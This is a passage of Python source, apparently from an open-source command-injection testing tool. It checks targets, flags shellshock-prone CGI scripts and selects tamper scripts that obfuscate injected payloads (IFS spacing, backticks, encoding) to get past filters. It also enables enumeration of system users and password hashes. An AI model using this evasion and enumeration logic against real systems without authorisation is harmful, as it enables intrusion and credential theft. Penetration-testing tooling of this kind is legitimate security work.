  settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))

"""
Transformation of separators if time-based injection
"""
def time_based_separators(separator, http_request_method):
  if separator == "||"  or separator == "&&" :
    separator = separator[:1]
    if menu.options.data:
      separator = _urllib.parse.quote(separator)
  return separator

"""
Information message if platform does not have
GNU 'readline' module installed.
"""
def no_readline_module():
  err_msg =  "It seems your platform does "
  err_msg += "not have GNU 'readline' module installed."
  err_msg += " Download the"
  if settings.IS_WINDOWS:
    err_msg += " 'pyreadline' package (https://pypi.python.org/pypi/pyreadline) or the 'pyreadline3' package (https://pypi.python.org/pypi/pyreadline3) instead."
  elif settings.PLATFORM == "mac":
    err_msg += " 'gnureadline' package (https://pypi.python.org/pypi/gnureadline)."
  settings.print_data_to_stdout(settings.print_critical_msg(err_msg))

"""
Check for incompatible OS (i.e Unix).
"""
def ps_incompatible_os():
  if not settings.TARGET_OS == settings.OS.WINDOWS:
    warn_msg = "The identified OS seems incompatible with the provided '--ps-version' switch."
    settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
    return True

"""
Check if PowerShell is enabled.
"""
def ps_check():
  if settings.PS_ENABLED == None and menu.options.is_admin or menu.options.users or menu.options.passwords:
    if settings.VERBOSITY_LEVEL != 0:
      settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
    while True:
      message = "Some payloads in the selected options require PowerShell. "
      message += "Do you want to use the '--ps-version' flag "
      message += "to ensure it is enabled? [Y/n] > "
      ps_check = common.read_input(message, default="Y", check_batch=True)
      if ps_check in settings.CHOICE_YES:
        menu.options.ps_version = True
        break
      elif ps_check in settings.CHOICE_NO:
        break
      elif ps_check in settings.CHOICE_QUIT:
        raise SystemExit()
      else:
        common.invalid_option(ps_check)
        pass

"""
If PowerShell is disabled.
"""
def ps_check_failed():
  while True:
    message = "Do you want to proceed despite the above warning? [Y/n] > "
    ps_check = common.read_input(message, default="Y", check_batch=True)
    if ps_check in settings.CHOICE_YES:
      break
    elif ps_check in settings.CHOICE_NO:
      settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
      os._exit(0)
    else:
      common.invalid_option(ps_check)
      pass

"""
Check if CGI scripts (shellshock injection).
"""
def check_CGI_scripts(url):
  CGI_SCRIPTS = common.load_list_from_file(settings.CGI_SCRIPTS, "CGI scripts list")

  _ = False
  for cgi_script in CGI_SCRIPTS:
    if cgi_script in url:
      info_msg = "Heuristic (basic) tests show that target URL might contain a script "
      info_msg += "vulnerable to shellshock. "
      _ = True
      settings.print_data_to_stdout(settings.print_bold_info_msg(info_msg))
      while True:
        message = "Do you want to enable the shellshock module ('--shellshock')? [Y/n] > "
        shellshock_check = common.read_input(message, default="Y", check_batch=True)
        if shellshock_check in settings.CHOICE_YES:
          menu.options.shellshock = True
          break
        elif shellshock_check in settings.CHOICE_NO:
          menu.options.shellshock = False
          break
        elif shellshock_check in settings.CHOICE_QUIT:
          raise SystemExit()
        else:
          common.invalid_option(shellshock_check)
          pass
  if not _:
    menu.options.shellshock = False

def check_url(url):
  try:
    return _urllib.parse.urlsplit(url)
  except ValueError as ex:
    err_msg = "Invalid target URL provided. "
    err_msg += "Please ensure there are no leftover characters (e.g., '[' or ']') "
    err_msg += "in the hostname part."
    settings.print_data_to_stdout(settings.print_critical_msg(err_msg))
    raise SystemExit()

"""
Check if http / https.
"""
def check_http_s(url):
  url_split = check_url(url)
  if url_split.username and url_split.password and "@" in url_split.netloc:
    url = url.replace(url_split.netloc,url_split.netloc.split("@")[1])
 
  if settings.SINGLE_WHITESPACE in url:
    url = url.replace(settings.SINGLE_WHITESPACE, _urllib.parse.quote_plus(settings.SINGLE_WHITESPACE))

  if not menu.options.proxy and (_urllib.parse.urlparse(url).hostname in ("localhost", "127.0.0.1") or menu.options.ignore_proxy):
    menu.options.ignore_proxy = True

  if settings.CHECK_INTERNET:
      url = settings.CHECK_INTERNET_ADDRESS
  else:
    if re.search(r'^(?:http)s?://', url, re.I):
      if not re.search(r"^(http|ws)s?://", url, re.I):
        if re.search(r":443\b", url):
          url = "https://" + url
        else:
          url = "http://" + url
      settings.SCHEME = (url_split.scheme.strip().lower() or "http") if not menu.options.force_ssl else "https"
    else:
      err_msg = "Invalid target URL provided. "
      settings.print_data_to_stdout(settings.print_critical_msg(err_msg))
      raise SystemExit()

  if _urllib.parse.urlparse(url).scheme != settings.SCHEME:
    if menu.options.force_ssl and settings.VERBOSITY_LEVEL != 0:
      debug_msg = "Forcing usage of SSL/HTTPS requests."
      settings.print_data_to_stdout(settings.print_debug_msg(debug_msg))
    url = url.replace(_urllib.parse.urlparse(url).scheme, settings.SCHEME)

  return url

"""
Checking connection (resolving hostname).
"""
def check_connection(url):
  hostname = _urllib.parse.urlparse(url).hostname or ''
  if not re.search(r"\A\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\Z", hostname):
    if not any((menu.options.proxy, menu.options.tor, menu.options.offline)):
      try:
        if settings.VERBOSITY_LEVEL != 0:
          debug_msg = "Resolving hostname '" + hostname + "'."
          settings.print_data_to_stdout(settings.print_debug_msg(debug_msg))
        socket.getaddrinfo(hostname, None)
      except socket.gaierror:
        err_msg = "Host '" + hostname + "' does not exist."
        if not settings.MULTI_TARGETS:
          settings.print_data_to_stdout(settings.print_critical_msg(err_msg))
          raise SystemExit()
      except (socket.error, UnicodeError) as e:
        err_msg = "Problem occurred while "
        err_msg += "resolving a host name '" + hostname + "'"
        if not settings.MULTI_TARGETS:
          settings.print_data_to_stdout(settings.print_critical_msg(err_msg))
          raise SystemExit()

"""
Force the user-defined operating system.
"""
def user_defined_os():
  if menu.options.os:
    if menu.options.os.lower() == "windows":
      settings.TARGET_OS = settings.OS.WINDOWS
      return True
    elif menu.options.os.lower() == "unix":
      return True
    else:
      err_msg = "You defined an invalid value '" + menu.options.os + "' "
      err_msg += "for operation system. The value, must be 'Windows' or 'Unix'."
      settings.print_data_to_stdout(settings.print_critical_msg(err_msg))
      raise SystemExit()

"""
Define the target operating system.
"""
def define_target_os():
  # If "--shellshock" option is provided then, by default is a Linux/Unix operating system.
  if menu.options.shellshock:
    return
  else:
    while True:
      message = "Do you recognize the server's underlying operating system? "
      message += "[(N)o/(u)nix-like/(w)indows/(q)uit] > "
      got_os = common.read_input(message, default="N", check_batch=True)
      if got_os.lower() in settings.CHOICE_OS :
        if got_os.lower() == "u":
          return
        elif got_os.lower() == "w":
          settings.TARGET_OS = settings.OS.WINDOWS
          return
        elif got_os.lower() == "n":
          settings.CHECK_BOTH_OS = True

          return
        elif got_os.lower() == "q":
          raise SystemExit()
      else:
        common.invalid_option(got_os)
        pass

"""
Decision if the user-defined operating system name,
is different than the one identified by heuristics.
"""
def identified_os():
    if settings.IGNORE_IDENTIFIED_OS == None:
      warn_msg = "Identified different operating system (i.e. '"
      warn_msg += settings.TARGET_OS.title() + "'), than the defined (i.e. '" + menu.options.os.title() + "')."
      settings.print_data_to_stdout(settings.print_bold_warning_msg(warn_msg))
      message = "How do you want to proceed? [(C)ontinue/(s)kip] > "
      proceed_option = common.read_input(message, default="S", check_batch=True)
      if proceed_option.lower() in settings.CHOICE_PROCEED :
        if proceed_option.lower() == "c":
          settings.IGNORE_IDENTIFIED_OS = True
          return settings.IGNORE_IDENTIFIED_OS
        elif proceed_option.lower() == "s":
          settings.IGNORE_IDENTIFIED_OS = False
          return settings.IGNORE_IDENTIFIED_OS
        elif proceed_option.lower() == "q":
          raise SystemExit()
      else:
        common.invalid_option(proceed_option)
        pass

"""
Checking for all required third-party library dependencies.
"""
def third_party_dependencies():
  if settings.VERBOSITY_LEVEL != 0:
    debug_msg = "Checking for all required third-party library dependencies."
    settings.print_data_to_stdout(settings.print_debug_msg(debug_msg))

  try:
    import sqlite3
  except ImportError:
    err_msg = settings.APPLICATION + " requires 'sqlite3' third-party library "
    err_msg += "to store previous injection points and commands. "
    settings.print_data_to_stdout(settings.print_critical_msg(err_msg))
    raise SystemExit()

  try:
    import readline
  except (ImportError, AttributeError):
    if settings.IS_WINDOWS:
      try:
        import pyreadline
      except ImportError:
        err_msg = "The 'pyreadline' (third-party) library is required "
        err_msg += "to enable TAB completion and history support features."
        settings.print_data_to_stdout(settings.print_error_msg(err_msg))
    elif settings.PLATFORM == "posix":
      try:
        import gnureadline
      except ImportError:
        err_msg = "The 'gnureadline' (third-party) library is required "
        err_msg += "to enable TAB completion and history support features."
        settings.print_data_to_stdout(settings.print_error_msg(err_msg))
    pass

"""
Print the authentiation error message.
"""
def http_auth_err_msg():
  err_msg = "Use the '--auth-cred' option to provide a valid pair of "
  err_msg += "HTTP authentication credentials (e.g., --auth-cred=\"admin:admin\"), "
  err_msg += "or use the '--ignore-code=401' option to ignore HTTP error 401 (Unauthorized) "
  err_msg += "and continue tests without providing valid credentials."
  settings.print_data_to_stdout(settings.print_critical_msg(err_msg))
  raise SystemExit()

"""
Error while accessing session file
"""
def error_loading_session_file():
  err_msg = "An error occurred while accessing session file ('"
  err_msg += settings.SESSION_FILE + "'). "
  err_msg += "Use the '--flush-session' option."
  settings.print_data_to_stdout(settings.print_critical_msg(err_msg))
  raise SystemExit()

"""
EOFError
"""
def EOFError_err_msg():
  if settings.STDIN_PARSING:
    settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
  err_msg = "Exiting, due to EOFError."
  settings.print_data_to_stdout(settings.print_error_msg(err_msg))

"""
Message regarding unexpected time delays
"""
def time_delay_recommendation():
  warn_msg = "Due to unexpected time delays, it is highly "
  warn_msg += "recommended to enable the 'reverse_tcp' option.\n"
  settings.print_data_to_stdout(settings.END_LINE.CR + settings.print_warning_msg(warn_msg))

"""
Message regarding unexpected time delays due to unstable requests
"""
def time_delay_due_to_unstable_request(timesec):
  message = "Unexpected time delays, which could cause false-positive results, have been identified."
  settings.print_data_to_stdout(settings.END_LINE.CR)
  while True:
    message = message + " How do you want to proceed? [(C)ontinue/(s)kip] > "
    proceed_option = common.read_input(message, default="C", check_batch=True)
    if proceed_option.lower() in settings.CHOICE_PROCEED :
      if proceed_option.lower() == "c":
        timesec = timesec + 1
        false_positive_fixation = True
        return timesec, false_positive_fixation 
      elif proceed_option.lower() == "s":
        false_positive_fixation = False
        return timesec, false_positive_fixation
      elif proceed_option.lower() == "q":
        raise SystemExit()
    else:
      common.invalid_option(proceed_option)
      pass

"""
Time related shell condition 
"""
def time_related_shell(url_time_response, exec_time, timesec):
  if (url_time_response == 0 and (exec_time - timesec) >= 0) or \
     (url_time_response != 0 and (exec_time - timesec) == 0 and (exec_time == timesec)) or \
     (url_time_response != 0 and (exec_time - timesec) > 0 and (exec_time >= timesec + 1)):
    return True
  else:
    return False

"""
Message regarding time related attcks
"""
def time_related_attaks_msg():
  if not settings.TIME_RELATED_ATTACK_WARNING:
    warn_msg = "It is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions."
    settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
  settings.TIME_RELATED_ATTACK_WARNING = True

"""
Check if defined "--url-reload" option.
"""
def reload_url_msg(technique):
  warn_msg = "On the " + technique + "technique, the '--url-reload' option is not available."
  settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))

"""
Decision if the user-defined HTTP authenticatiob type,
is different than the one identified by heuristics.
"""
def identified_http_auth_type(auth_type):
  warn_msg = "Identified different HTTP authentication type ("
  warn_msg += auth_type.lower() + ") than that you have provided ("
  warn_msg += menu.options.auth_type + ")."
  settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
  message = "How do you want to proceed? [(C)ontinue/(s)kip] > "
  proceed_option = common.read_input(message, default="C", check_batch=True)
  if proceed_option.lower() in settings.CHOICE_PROCEED :
    if proceed_option.lower() == "s":
      return False
    elif proceed_option.lower() == "c":
      return True
    elif proceed_option.lower() == "q":
      raise SystemExit()
  else:
    common.invalid_option(proceed_option)
    pass

"""
Retrieve everything from the supported enumeration options.
"""
def enable_all_enumeration_options():
  # Retrieve current user name.
  menu.options.current_user = True
  # Retrieve current hostname.
  menu.options.hostname = True
  # Retrieve system information.
  menu.options.sys_info = True
  if settings.TARGET_OS == settings.OS.WINDOWS:
    # Check if the current user have admin privileges.
    menu.options.is_admin = True
    # Retrieve PowerShell's version number.
    menu.options.ps_version = True
  else:
    # Check if the current user have root privileges.
    menu.options.is_root = True
  # Retrieve system users.
  menu.options.users = True
  # Retrieve system users privileges.
  menu.options.privileges = True
  # Retrieve system users password hashes.
  menu.options.passwords = True

"""
Check provided parameters for tests
"""
def check_provided_parameters():

  if menu.options.test_parameter or menu.options.skip_parameter:
    if menu.options.test_parameter != None :
      if menu.options.test_parameter.startswith("="):
        menu.options.test_parameter = menu.options.test_parameter[1:]
      settings.TESTABLE_PARAMETERS_LIST = menu.options.test_parameter.split(settings.PARAMETER_SPLITTING_REGEX)

    elif menu.options.skip_parameter != None :
      if menu.options.skip_parameter.startswith("="):
        menu.options.skip_parameter = menu.options.skip_parameter[1:]
      settings.TESTABLE_PARAMETERS_LIST = menu.options.skip_parameter.split(settings.PARAMETER_SPLITTING_REGEX)

    for i in range(0,len(settings.TESTABLE_PARAMETERS_LIST)):
      if "=" in settings.TESTABLE_PARAMETERS_LIST[i]:
        settings.TESTABLE_PARAMETERS_LIST[i] = settings.TESTABLE_PARAMETERS_LIST[i].split("=")[0]

"""
Remove skipped parameters
"""
def remove_skipped_params(url, check_parameters):
  testable_parameters = list(set(check_parameters) - set(menu.options.skip_parameter.split(",")))
  settings.TESTABLE_PARAMETERS_LIST = [x for x in testable_parameters if x not in settings.PARAMETER_SPLITTING_REGEX.join(settings.TESTABLE_PARAMETERS_LIST).split(settings.PARAMETER_SPLITTING_REGEX)]
  _ = []
  for parameter in check_parameters:
    if parameter not in settings.PARAMETER_SPLITTING_REGEX.join(settings.TESTABLE_PARAMETERS_LIST).split(settings.PARAMETER_SPLITTING_REGEX):
      _.append(parameter)
  if _:    
    info_msg = "Skipping " + check_http_method(url) + " parameter" + ('', 's')[len(_) > 1] + " '" + str(", ".join(_)) + "'."
    settings.print_data_to_stdout(settings.print_info_msg(info_msg))
  menu.options.test_parameter = True

"""
Identify and print non-listed parameters that were provided but not part of the testable list.
"""
def testable_parameters(url, check_parameters, header_name):
  # Skip parameters if requested
  if menu.options.skip_parameter is not None:
    remove_skipped_params(url, check_parameters)

  if isinstance(settings.TESTABLE_PARAMETERS_LIST, list) and settings.TESTABLE_PARAMETERS_LIST:
    raw_params = settings.PARAMETER_SPLITTING_REGEX.join(settings.TESTABLE_PARAMETERS_LIST)
    normalized_params = raw_params.replace(settings.SINGLE_WHITESPACE, "")
    testable_params = normalized_params.split(settings.PARAMETER_SPLITTING_REGEX)

    non_listed_params = list(set(testable_params) - set(check_parameters))

    # Determine testable state
    settings.TESTABLE_PARAMETERS = bool(
      settings.TESTABLE_PARAMETERS or 
      any(p in check_parameters for p in settings.TESTABLE_PARAMETERS_LIST)
    )

    if non_listed_params:
      normalized_non_exist = settings.PARAMETER_SPLITTING_REGEX.join(non_listed_params)
      normalized_non_exist = normalized_non_exist.replace(settings.SINGLE_WHITESPACE, "")
      non_listed_params = normalized_non_exist.split(settings.PARAMETER_SPLITTING_REGEX)

      http_method = check_http_method(url)
      if non_listed_params and http_method not in settings.METHODS_WITH_NON_LISTED_PARAMS:
        settings.METHODS_WITH_NON_LISTED_PARAMS.append(http_method)
        non_listed_params_items = ", ".join(non_listed_params)
        warn_msg = "Provided parameter" + ("s" if len(non_listed_params) != 1 else "") + " '"
        warn_msg += non_listed_params_items + "'" + (" are", " is")[len(non_listed_params) == 1]
        warn_msg += " not inside the " + http_method + "."
        settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
        
"""
Lists available tamper scripts
"""
def list_tamper_scripts():
  info_msg = "Listing available tamper scripts."
  settings.print_data_to_stdout(settings.print_info_msg(info_msg))
  if menu.options.list_tampers:
    for script in sorted(glob(os.path.join(settings.TAMPER_SCRIPTS_PATH, "*.py"))):
      content = open(script, "rb").read().decode(settings.DEFAULT_CODEC)
      match = re.search(r"About:(.*)\n", content)
      if match:
        comment = match.group(1).strip()
        settings.print_data_to_stdout(settings.SUB_CONTENT_SIGN_TYPE + os.path.basename(script) + Style.RESET_ALL +  " - " + comment)

"""
Tamper script checker
"""
def tamper_scripts(stored_tamper_scripts):
  if menu.options.tamper:
    # Check the provided tamper script(s)
    available_scripts = []
    provided_scripts = list(re.split(settings.PARAMETER_SPLITTING_REGEX, menu.options.tamper.lower()))
    for script in sorted(glob(os.path.join(settings.TAMPER_SCRIPTS_PATH, "*.py"))):
      available_scripts.append(os.path.basename(script.split(".py")[0]))
    for script in provided_scripts:
      if script in available_scripts:
        pass
      else:
        err_msg = "The '" + script + "' tamper script does not exist. "
        err_msg += "Use the '--list-tampers' option for listing available tamper scripts."
        settings.print_data_to_stdout(settings.print_critical_msg(err_msg))
        raise SystemExit()
    if not stored_tamper_scripts:
      info_msg = "Loaded tamper script" + ('s', '')[len(provided_scripts) == 1] + ": "
      settings.print_data_to_stdout(settings.print_info_msg(info_msg))
    for script in provided_scripts:
      if "hexencode" or "base64encode" == script:
        settings.MULTI_ENCODED_PAYLOAD.append(script)
      import_script = str(settings.TAMPER_SCRIPTS_PATH + script + ".py").replace("/",".").split(".py")[0]
      if not stored_tamper_scripts:
        settings.print_data_to_stdout(settings.SUB_CONTENT_SIGN + import_script.split(".")[-1])
      warn_msg = ""
      if not settings.TIME_RELATED_ATTACK and script in settings.TIME_RELATED_TAMPER_SCRIPTS:
        warn_msg = "Only time-related techniques support the usage of '" + script  + ".py'."
        settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
      warn_msg = ""
      if settings.EVAL_BASED_STATE != False and script in settings.EVAL_NOT_SUPPORTED_TAMPER_SCRIPTS:
        warn_msg = "The dynamic code evaluation technique does "
      elif settings.TARGET_OS == settings.OS.WINDOWS and script in settings.WIN_NOT_SUPPORTED_TAMPER_SCRIPTS:
        warn_msg = "Windows targets do "
      elif settings.TARGET_OS != settings.OS.WINDOWS and script in settings.UNIX_NOT_SUPPORTED_TAMPER_SCRIPTS:
        warn_msg = "Unix-like targets do "
      elif "backticks" == script and menu.options.alter_shell:
          warn_msg = "Option '--alter-shell' "
      if len(warn_msg) != 0:
        if not stored_tamper_scripts:
          warn_msg = warn_msg + "not support the usage of '" + script + ".py'. Skipping tamper script."
          settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
      else:
        # if not stored_tamper_scripts:
        #   settings.print_data_to_stdout(settings.SUB_CONTENT_SIGN + import_script.split(".")[-1])
        try:
          module = __import__(import_script, fromlist=[None])
          if not hasattr(module, "__tamper__"):
            err_msg = "Missing variable '__tamper__' "
            err_msg += "in tamper script '" + import_script.split(".")[-1] + "'."
            settings.print_data_to_stdout(settings.print_critical_msg(err_msg))
            raise SystemExit()
        except (ImportError, ValueError) as err_msg:
          pass

    # Using too many tamper scripts is usually not a good idea. :P
    _ = False
    if len(provided_scripts) >= 3 and not settings.LOAD_SESSION:
      warn_msg = "Using too many tamper scripts "
      _ = True
    elif len([x for x in provided_scripts if any(y in x for y in ["nested", "doublequotes"])]) == 2 and not settings.LOAD_SESSION:
      _ = True
      warn_msg = "The combination of the provided tamper scripts "
    if _:
      warn_msg += "is not a good idea (may cause false positive / negative results)."
      settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))

"""
Check if the payload output seems to be hex.
"""
def hex_output(payload):
  if not settings.TAMPER_SCRIPTS['hexencode']:
    if menu.options.tamper:
      menu.options.tamper = menu.options.tamper + ",hexencode"
    else:
      menu.options.tamper = "hexencode"

"""
Check if the payload output seems to be base64.
"""
def base64_output(payload):
  if not settings.TAMPER_SCRIPTS['base64encode']:
    if menu.options.tamper:
      menu.options.tamper = menu.options.tamper + ",base64encode"
    else:
      menu.options.tamper = "base64encode"

"""
Check for modified whitespaces.
"""
def whitespace_check(payload):

  _ = []
  whitespaces = ["${IFS}", "+", "%09", "%0b", "%20"]
  for whitespace in whitespaces:
    if whitespace in payload:
      _.append(whitespace)

  # Enable the "space2ifs" tamper script.
  if "${IFS}" in _:
    if not settings.TAMPER_SCRIPTS['space2ifs']:
      if menu.options.tamper:
        menu.options.tamper = menu.options.tamper + ",space2ifs"
      else:
        menu.options.tamper = "space2ifs"
    settings.WHITESPACES[0] = "${IFS}"

  # Enable the "space2plus" tamper script.
  elif "+" in _ and payload.count("+") >= 2:
    if not settings.TAMPER_SCRIPTS['space2plus']:
      if menu.options.tamper:
        menu.options.tamper = menu.options.tamper + ",space2plus"
      else:
        menu.options.tamper = "space2plus"
    settings.WHITESPACES[0] = "+"

  # Enable the "space2htab" tamper script.
  elif "%09" in _:
    if not settings.TAMPER_SCRIPTS['space2htab']:
      if menu.options.tamper:
        menu.options.tamper = menu.options.tamper + ",space2htab"
      else:
        menu.options.tamper = "space2htab"
    settings.WHITESPACES[0] = "%09"

  # Enable the "space2vtab" tamper script.
  elif "%0b" in _:
    if not settings.TAMPER_SCRIPTS['space2vtab']:
      if menu.options.tamper:
        menu.options.tamper = menu.options.tamper + ",space2vtab"
      else:
        menu.options.tamper = "space2vtab"
    settings.WHITESPACES[0] = "%0b"

  # Default whitespace
  else :
    settings.WHITESPACES[0] = "%20"

  # Enable the "multiplespaces" tamper script.
  count_spaces = payload.count(settings.WHITESPACES[0])
  if count_spaces > 15:
    if menu.options.tamper:
      menu.options.tamper = menu.options.tamper + ",multiplespaces"
    else:
      menu.options.tamper = "multiplespaces"
    settings.WHITESPACES[0] = settings.WHITESPACES[0] * int(count_spaces / 2)

"""
Check for symbols (i.e "`", "^", "$@" etc) between the characters of the generated payloads.
"""
def other_symbols(payload):
  # Implemented check to replace each character in a user-supplied OS command with a random case.
  if payload.count("|tr \"[A-Z]\" \"[a-z]\"") >= 1 and settings.TARGET_OS != settings.OS.WINDOWS:
    if not settings.TAMPER_SCRIPTS['randomcase']:
      if menu.options.tamper:
        menu.options.tamper = menu.options.tamper + ",randomcase"
      else:
        menu.options.tamper = "randomcase"

  # Check for reversed (characterwise) user-supplied operating system commands.
  if payload.count("|rev") >= 1 and settings.TARGET_OS != settings.OS.WINDOWS:
    if not settings.TAMPER_SCRIPTS['rev']:
      if menu.options.tamper:
        menu.options.tamper = menu.options.tamper + ",rev"
      else:
        menu.options.tamper = "rev"

  # Check for (multiple) backticks (instead of "$()") for commands substitution on the generated payloads.
  if payload.count("`") >= 2 and settings.TARGET_OS != settings.OS.WINDOWS:
    if menu.options.tamper:
      menu.options.tamper = menu.options.tamper + ",backticks"
    else:
      menu.options.tamper = "backticks"
    settings.USE_BACKTICKS == True

  # Check for caret symbol
  if payload.count("^") >= 10:
    if not settings.TAMPER_SCRIPTS['caret']:
      if menu.options.tamper:
        menu.options.tamper = menu.options.tamper + ",caret"
      else:
        menu.options.tamper = "caret"

  # Check for dollar sign followed by an at-sign
  if payload.count("$@") >= 10 and settings.TARGET_OS != settings.OS.WINDOWS:
    if not settings.TAMPER_SCRIPTS['dollaratsigns']:
      if menu.options.tamper:
        menu.options.tamper = menu.options.tamper + ",dollaratsigns"
      else:
        menu.options.tamper = "dollaratsigns"

  # Check for uninitialized variable
  if len(re.findall(r'\${.*?}', payload)) >= 10 and settings.TARGET_OS != settings.OS.WINDOWS:
    if not settings.TAMPER_SCRIPTS['uninitializedvariable']:
      if menu.options.tamper:
        menu.options.tamper = menu.options.tamper + ",uninitializedvariable"
      else:
        menu.options.tamper = "uninitializedvariable"

  # Check for environment variable value variable
  if payload.count("${PATH%%u*}") >= 2 and settings.TARGET_OS != settings.OS.WINDOWS:
    if not settings.TAMPER_SCRIPTS['slash2env']:
      if menu.options.tamper:
        menu.options.tamper = menu.options.tamper + ",slash2env"
      else:
        menu.options.tamper = "slash2env"

"""
Check for (multiple) added back slashes between the characters of the generated payloads.
"""
def check_backslashes(payload):
  # Check for single quotes
  if payload.count("\\") >= 15 and settings.TARGET_OS != settings.OS.WINDOWS:
    if not settings.TAMPER_SCRIPTS['backslashes']:
      if menu.options.tamper:
        menu.options.tamper = menu.options.tamper + ",backslashes"
      else:
        menu.options.tamper = "backslashes"

"""
Check for quotes in the generated payloads.
"""
def check_quotes(payload):
  # Check for double quotes around of the generated payloads.
  if payload.endswith("\"") and settings.TARGET_OS != settings.OS.WINDOWS:
    if not settings.TAMPER_SCRIPTS['nested']:
      if menu.options.tamper:
        menu.options.tamper = menu.options.tamper + ",nested"
      else:
        menu.options.tamper = "nested"

  # Check for (multiple) added double-quotes between the characters of the generated payloads.
  if payload.count("\"") >= 10 and settings.TARGET_OS != settings.OS.WINDOWS:
    if not settings.TAMPER_SCRIPTS['doublequotes']:
      if menu.options.tamper:
        menu.options.tamper = menu.options.tamper + ",doublequotes"
      else:
        menu.options.tamper = "doublequotes"

  # Check for (multiple) added single-quotes between the characters of the generated payloads.
  if payload.count("''") >= 10 and settings.TARGET_OS != settings.OS.WINDOWS:
    if not settings.TAMPER_SCRIPTS['singlequotes']:
      if menu.options.tamper:
        menu.options.tamper = menu.options.tamper + ",singlequotes"
      else:
        menu.options.tamper = "singlequotes"

"""
Check for applied (hex / b64) encoders.
"""
def check_encoders(payload):
  is_decoded = False
  encoded_with = ""
  check_value = payload

  settings.MULTI_ENCODED_PAYLOAD = list(dict.fromkeys(settings.MULTI_ENCODED_PAYLOAD))
  for encode_type in settings.MULTI_ENCODED_PAYLOAD:
    if encode_type == 'base64encode' or encode_type == 'hexencode':
      while True:
        message = "Do you want to keep using the '" + encode_type + "' tamper script? [y/N] > "
        procced_option = common.read_input(message, default="N", check_batch=True)
        if procced_option in settings.CHOICE_YES:
          break
        elif procced_option in settings.CHOICE_NO:
          if settings.VERBOSITY_LEVEL != 0:
            debug_msg = "Unloading the '" + encode_type + "' tamper script."
            settings.print_data_to_stdout(settings.print_debug_msg(debug_msg))
          settings.MULTI_ENCODED_PAYLOAD.remove(encode_type)
          break
        elif procced_option in settings.CHOICE_QUIT:
          raise SystemExit()
        else:
          common.invalid_option(procced_option)
          pass

  if (len(check_value.strip()) % 4 == 0) and \
    re.match(settings.BASE64_RECOGNITION_REGEX, check_value) and \
    not re.match(settings.HEX_RECOGNITION_REGEX, check_value):
      _payload = base64.b64decode(check_value)
      try:
        if not "\\x" in _payload.decode(settings.DEFAULT_CODEC):
          settings.MULTI_ENCODED_PAYLOAD.append("base64encode")
          decoded_payload = _payload
          encoded_with = "base64"
          if re.match(settings.HEX_RECOGNITION_REGEX, check_value):
            decoded_payload, _ = hexdecode(decoded_payload)
            if _:
              settings.MULTI_ENCODED_PAYLOAD.append("hexencode")
              encoded_with = "hex"
      except Exception:
        pass

  elif re.match(settings.HEX_RECOGNITION_REGEX, check_value):
    decoded_payload, _ = hexdecode(check_value)
    if _:
      settings.MULTI_ENCODED_PAYLOAD.append("hexencode")
      encoded_with = "hex"
      if (len(check_value.strip()) % 4 == 0) and \
        re.match(settings.BASE64_RECOGNITION_REGEX, decoded_payload) and \
        not re.match(settings.HEX_RECOGNITION_REGEX, decoded_payload):
          _payload = base64.b64decode(check_value)
          try:
            if not "\\x" in _payload.decode(settings.DEFAULT_CODEC):
              settings.MULTI_ENCODED_PAYLOAD.append("base64encode")
              decoded_payload = _payload
              encoded_with = "base64"
          except Exception:
            pass
  else:
    decoded_payload = payload

  if len(encoded_with) != 0:
    is_decoded = True

  if is_decoded:
    while True:
      message = "The value appears to be " + encoded_with + "-encoded. "
      message += "Do you want to use the '" + encoded_with + "encode' tamper script? [Y/n] > "
      procced_option = common.read_input(message, default="Y", check_batch=True)
      if procced_option in settings.CHOICE_YES:
        break
      elif procced_option in settings.CHOICE_NO:
        settings.MULTI_ENCODED_PAYLOAD.remove(encoded_with + "encode")
        if settings.VERBOSITY_LEVEL != 0:
          debug_msg = "Skipping load the '" + encoded_with + "encode' tamper script."
          settings.print_data_to_stdout(settings.print_debug_msg(debug_msg))
        break
      elif procced_option in settings.CHOICE_QUIT:
        raise SystemExit()
      else:
        common.invalid_option(procced_option)
        pass

  if is_decoded:
    return _urllib.parse.quote(decoded_payload), encoded_with
  else:
    return payload, encoded_with

"""
Recognise the payload.
"""
def recognise_payload(payload):
  if "usleep" in payload and settings.TARGET_OS != settings.OS.WINDOWS:
    if not settings.TAMPER_SCRIPTS['sleep2usleep']:
      if menu.options.tamper:
        menu.options.tamper = menu.options.tamper + ",sleep2usleep"
      else:
        menu.options.tamper = "sleep2usleep"

  elif "timeout" in payload:
    if not settings.TAMPER_SCRIPTS['sleep2timeout']:
      if menu.options.tamper:
        menu.options.tamper = menu.options.tamper + ",sleep2timeout"
      else:
        menu.options.tamper = "sleep2timeout"

  return check_encoders(payload)
  
"""
Check for stored payloads and enable tamper scripts.
"""
def check_for_stored_tamper(payload):
  decoded_payload, encoded_with = recognise_payload(payload)
  whitespace_check(decoded_payload)
  other_symbols(decoded_payload)
  check_quotes(decoded_payload)
  tamper_scripts(stored_tamper_scripts=True)

"""
Perform payload modification
"""
def perform_payload_modification(payload):
  try:
    settings.RAW_PAYLOAD = payload.replace(settings.WHITESPACES[0], settings.SINGLE_WHITESPACE)
  except IndexError:
    settings.RAW_PAYLOAD = payload
    
  for extra_http_headers in list(settings.MULTI_ENCODED_PAYLOAD[::-1]):
    if extra_http_headers == "xforwardedfor":
      from src.core.tamper import xforwardedfor

  for mod_type in list(settings.MULTI_ENCODED_PAYLOAD[::-1]):
    # Reverses (characterwise) the user-supplied operating system commands
    if mod_type == 'backticks':
      from src.core.tamper import backticks
      payload = backticks.tamper(payload)

  for mod_type in list(settings.MULTI_ENCODED_PAYLOAD[::-1]):
    # Reverses (characterwise) the user-supplied operating system commands
    if mod_type == 'rev':
      from src.core.tamper import rev
      payload = rev.tamper(payload)

  for mod_type in list(settings.MULTI_ENCODED_PAYLOAD[::-1]):
    # Replaces each user-supplied operating system command character with random case
